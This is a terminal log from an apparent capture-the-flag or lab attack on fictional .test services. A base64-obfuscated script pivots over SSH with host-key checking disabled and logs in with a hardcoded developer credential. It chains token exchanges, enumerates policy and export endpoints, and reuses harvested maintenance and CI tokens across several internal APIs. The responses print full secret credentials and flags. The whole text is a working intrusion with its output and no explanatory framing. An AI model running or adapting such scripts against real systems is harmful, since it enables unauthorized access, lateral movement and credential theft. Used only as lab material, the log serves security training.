@@ -1,0 +1,308 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k14_r26.sh <<'B64EOF'
+> c2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD04IHJvd2FuLWRldiAnYmFzaCAtcycgPDwnUlNIJwpzZXQgK2UKZXhwb3J0IEFXU19QQUdFUj0iIgpDQT0kSE9NRS8ubG9jYWwvc2hhcmUva2VwbGVyb3BzL2NhLmNydApCPWh0dHBzOi8vY2xvdWQtYXBpLmtlcGxlcm9wcy50ZXN0Cks9aHR0cHM6Ly9jbG91ZC1hcGkua2VwbGVyb3BzLnRlc3Q6NjQ0MwpVPSJyb3dhbi5pdG86ZmtfZGV2ZWxvcGVyX3lVV1RLU3FyYzE2eTNLNV81RGZRN3FhY2Z0OWItOXhvIgpXVD0kKGN1cmwgLXNTayAtbSAxMCAtdSAiJFUiIC1YIFBPU1QgLUggJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbicgLWQgJ3t9JyAiJEIvYXBpL3dvcmtzcGFjZXMvY3VycmVudC90b2tlbi1leGNoYW5nZSIgfCBweXRob24zIC1jICdpbXBvcnQgc3lzLGpzb247cHJpbnQoanNvbi5sb2FkKHN5cy5zdGRpbikuZ2V0KCJhY2Nlc3NfdG9rZW4iLCIiKSknKQpFSj0kKGN1cmwgLXNTayAtbSAxMCAtWCBQT1NUIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFdUIiAtSCAnQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyAtZCAne30nICIkQi9hcGkvdG9rZW4tZXhjaGFuZ2UvZmllbGRrZXN0LWV4cG9ydC1hY2Nlc3MiIHwgcHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pLmdldCgiYWNjZXNzX3Rva2VuIiwiIikpJykKUkM9ImZrX21haW50ZW5hbmNlX3J1bnRpbWVfM2dJUDNqOHc2ZmhrQlNxdjdKNXhsbE9yRFZhMkt6aWciCldDPSJma19jaV9tYWludGVuYW5jZV9uVTdWM0RPbnE3a3B5QXdwNDZjVjUwbU84ZnF0eEhTSiIKZygpeyBuPSIkMSI7IHNoaWZ0OyBlY2hvICIjIyMjIyAkbiI7IGN1cmwgLXNTayAtbSAxMCAtLWNhY2VydCAkQ0EgLXcgJ1xuWyV7aHR0cF9jb2RlfV1cbicgIiRAIiB8IGhlYWQgLWMgMTgwMDsgZWNobzsgfQplY2hvICIjIyMjIyMjIyMjIEVYUE9SVCBKV1QgcG9saWN5IHByb2JlcyIKZm9yIHAgaW4gZmllbGRsaW5rLW1haW50ZW5hbmNlIG1haW50ZW5hbmNlIHBvbGljeS1maWVsZGxpbmstbWFpbnRlbmFuY2Ugc3VwcG9ydC1leHBvcnQgc3VwcG9ydCBmaWVsZGtlc3Qtc3VwcG9ydCBzdXBwb3J0LWV4cG9ydC1yZWFkZXIgZXhwb3J0LWFjY2VzcyByb2xlLWV4cG9ydC1hY2Nlc3M7IGRvCiBnICJFSiAvYXBpL3BvbGljaWVzLyRwIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRFSiIgIiRCL2FwaS9wb2xpY2llcy8kcCIKZG9uZQplY2hvICIjIyMjIyMjIyMjIEVYUE9SVCBKV1QgY2hhaW5lZCBleGNoYW5nZSIKZm9yIHIgaW4gZmllbGRrZXN0LXN1cHBvcnQtZXhwb3J0IHN1cHBvcnQtZXhwb3J0IGZpZWxka2VzdC1zdXBwb3J0IHN1cHBvcnQtcmVhZGVyIGZpZWxka2VzdC1zdXBwb3J0LXJlYWRlciBmaWVsZGtlc3QtYXJjaGl2ZSBhcmNoaXZlLWVkaXRvciBmaWVsZGtlc3QtbWFpbnRlbmFuY2UgbWFpbnRlbmFuY2UgZmllbGRrZXN0LWV4cG9ydC1hY2Nlc3MgZmllbGRrZXN0LWV4cG9ydC1yZWFkZXI7IGRvCiBnICJFSi0+JHIiIC1YIFBPU1QgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkRUoiIC1IICdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24nIC1kICd7fScgIiRCL2FwaS90b2tlbi1leGNoYW5nZS8kciIKZG9uZQplY2hvICIjIyMjIyMjIyMjIE1BSU5URU5BTkNFIENSRURTIG9uIGNsb3VkLWFwaSIKZm9yIFQgaW4gIiRSQyIgIiRXQyI7IGRvCiBlY2hvICI9PT09PSB0b2tlbiAke1Q6MDoyNH0iCiBmb3IgcCBpbiBhcGkvbWFpbnRlbmFuY2UgYXBpL3BvbGljaWVzL2ZpZWxkbGluay1tYWludGVuYW5jZSBhcGkvcG9saWNpZXMvZGVmYXVsdCBhcGkvZXhwb3J0cy9FWFAtMjg0MSBhcGkvZXhwb3J0cy9FWFAtMjg0MS9kZWZpbml0aW9uIGFwaS9leHBvcnRzL0VYUC0yODQxL3J1bnMgYXBpL3RydXN0LXJlY29yZHMvVFJVU1QtRkxYLTA0IGFwaS9idWlsZC1yZWNvcmRzL0JMRC0xODQyOyBkbwogIGcgIiRwIiAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRUIiAiJEIvJHAiCiBkb25lCmRvbmUKZWNobyAiIyMjIyMjIyMjIyBNQUlOVEVOQU5DRSBDUkVEUyBvbiBzdXBwb3J0IDo4NDQzIgpmb3IgVCBpbiAiJFJDIiAiJFdDIjsgZG8KIGVjaG8gIj09PT09IHRva2VuICR7VDowOjI0fSIKIGZvciBwIGluIGFwaS9oYW5kb3ZlcnMvY3VycmVudCBhcGkvbWFpbnRlbmFuY2UgYXBpL2V4cG9ydHMvRVhQLTI4NDEgYXBpL2FyY2hpdmUvaGFuZG92ZXJzL0NSUi1PRzIgYXBpL2FyY2hpdmUvaGFuZG92ZXJzL3Jvd2FuLml0byBhcGkvY3VzdG9tZXJzL1RFTi1BUldDLTA0Ny9kaWFnbm9zdGljcyBhcGkvZGlhZ25vc3RpY3MvRElBRy1DUlItTUlYRUQtMTk7IGRvCiAgZyAiJHAiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFQiICJodHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3Q6ODQ0My8kcCIKIGRvbmUKZG9uZQplY2hvICIjIyMjIyMjIyMjIE1BSU5URU5BTkNFIENSRURTIG9uIHN0YWZmIgpmb3IgVCBpbiAiJFJDIiAiJFdDIjsgZG8KIGVjaG8gIj09PT09IHRva2VuICR7VDowOjI0fSIKIGZvciBwIGluIGFwaS9zZXJ2aWNlLWRpcmVjdG9yeSBhcGkvYXJjaGl2ZS9oYW5kb3ZlcnMvQ1JSLU9HMiBhcGkvYXJjaGl2ZS9oYW5kb3ZlcnMvcm93YW4uaXRvIGFwaS9ub3Rlcy9OT1RFLVNVUC0yODQxLTc7IGRvCiAgZyAiJHAiIC1IICJBdXRob3JpemF0aW9uOiBCZWFyZXIgJFQiICJodHRwczovL3N0YWZmLmtlcGxlcm9wcy50ZXN0LyRwIgogZG9uZQpkb25lCmVjaG8gRE9ORV9SMjYKUlNICmVjaG8gRklOSVNIRUQK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k14_r26.sh; bash /tmp/k14_r26.sh; echo DONEMARK_1795207968983$((6*7))
+########## EXPORT JWT policy probes
+##### EJ /api/policies/fieldlink-maintenance
+{"archive_request":{"headers":{"scheduler_attestation":"X-Scheduler-Attestation","workload_class":"X-Workload-Class"}},"command":["maintenance-summary","--archive","FIELD-CRR-2026-09"],"flag":"FLAG{c3f9834223486bbe}","management_caller":"svc-fieldkest-runner","policy_id":"fieldlink-maintenance","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","scheduler":"fieldkest-scheduler","whoami":"svc-fieldkest-runner"}
+
+[200]
+
+##### EJ /api/policies/maintenance
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/policy-fieldlink-maintenance
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/support-export
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/support
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/fieldkest-support
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/support-export-reader
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/export-access
+{"error":"k3s_rbac_denied"}
+
+[403]
+
+##### EJ /api/policies/role-export-access
+{"accepted_input_audience":"fieldkest-build-records","access_token":"FLAG{f1aee508e418ac7c}","audience":"fieldkest-export-access","policy_id":"role-export-access","principal":"svc-fieldlink-export","role_id":"role/support-export-editor","schema":"fieldkest.role-record/v1","scope":"fieldkest-exports"}
+
+[200]
+
+########## EXPORT JWT chained exchange
+##### EJ->fieldkest-support-export
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->support-export
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->fieldkest-support
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->support-reader
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->fieldkest-support-reader
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->fieldkest-archive
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->archive-editor
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->fieldkest-maintenance
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->maintenance
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->fieldkest-export-access
+{"error":"subject_mismatch"}
+
+[403]
+
+##### EJ->fieldkest-export-reader
+{"error":"subject_mismatch"}
+
+[403]
+
+########## MAINTENANCE CREDS on cloud-api
+===== token fk_maintenance_runtime_3
+##### api/maintenance
+{"error":"authentication_required"}
+
+[401]
+
+##### api/policies/fieldlink-maintenance
+{"error":"earned_identity_required"}
+
+[401]
+
+##### api/policies/default
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/exports/EXP-2841
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/exports/EXP-2841/definition
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/exports/EXP-2841/runs
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/trust-records/TRUST-FLX-04
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/build-records/BLD-1842
+{"error":"k3s_returned_401"}
+
+[502]
+
+===== token fk_ci_maintenance_nU7V3D
+##### api/maintenance
+{"archive_asset":"CRR-OG2","field_archive":"FIELD-CRR-2026-09","policy_id":"fieldlink-maintenance","runtime_credential":"fk_maintenance_runtime_3gIP3j8w6fhkBSqv7J5xllOrDVa2Kzig","worker_credential":"fk_ci_maintenance_nU7V3DOnq7kpyAwp46cV50mO8fqtxHSJ","workload_class":"maintenance","workload_id":"MAINT-FLK-01"}
+
+[200]
+
+##### api/policies/fieldlink-maintenance
+{"archive_request":{"headers":{"scheduler_attestation":"X-Scheduler-Attestation","workload_class":"X-Workload-Class"}},"command":["maintenance-summary","--archive","FIELD-CRR-2026-09"],"flag":"FLAG{c3f9834223486bbe}","management_caller":"svc-fieldkest-runner","policy_id":"fieldlink-maintenance","required_label":{"workload.class":"maintenance"},"runtime_identity":"svc-fieldlink-maintenance","scheduler":"fieldkest-scheduler","whoami":"svc-fieldkest-runner"}
+
+[200]
+
+##### api/policies/default
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/exports/EXP-2841
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/exports/EXP-2841/definition
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/exports/EXP-2841/runs
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/trust-records/TRUST-FLX-04
+{"error":"k3s_returned_401"}
+
+[502]
+
+##### api/build-records/BLD-1842
+{"error":"k3s_returned_401"}
+
+[502]
+
+########## MAINTENANCE CREDS on support :8443
+===== token fk_maintenance_runtime_3
+##### api/handovers/current
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/maintenance
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/exports/EXP-2841
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/archive/handovers/CRR-OG2
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/archive/handovers/rowan.ito
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/customers/TEN-ARWC-047/diagnostics
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/diagnostics/DIAG-CRR-MIXED-19
+{"error":"integration_token_denied"}
+
+[403]
+
+===== token fk_ci_maintenance_nU7V3D
+##### api/handovers/current
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/maintenance
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/exports/EXP-2841
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/archive/handovers/CRR-OG2
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/archive/handovers/rowan.ito
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/customers/TEN-ARWC-047/diagnostics
+{"error":"integration_token_denied"}
+
+[403]
+
+##### api/diagnostics/DIAG-CRR-MIXED-19
+{"error":"integration_token_denied"}
+
+[403]
+
+########## MAINTENANCE CREDS on staff
+===== token fk_maintenance_runtime_3
+##### api/service-directory
+{"error":"unauthorized"}
+
+[401]
+
+##### api/archive/handovers/CRR-OG2
+{"error":"client_cert_required"}
+[401]
+
+##### api/archive/handovers/rowan.ito
+{"error":"client_cert_required"}
+[401]
+
+##### api/notes/NOTE-SUP-2841-7
+{"error":"unauthorized"}
+
+[401]
+
+===== token fk_ci_maintenance_nU7V3D
+##### api/service-directory
+{"error":"unauthorized"}
+
+[401]
+
+##### api/archive/handovers/CRR-OG2
+{"error":"client_cert_required"}
+[401]
+
+##### api/archive/handovers/rowan.ito
+{"error":"client_cert_required"}
+[401]
+
+##### api/notes/NOTE-SUP-2841-7
+{"error":"unauthorized"}
+
+[401]
+
+DONE_R26
+FINISHED
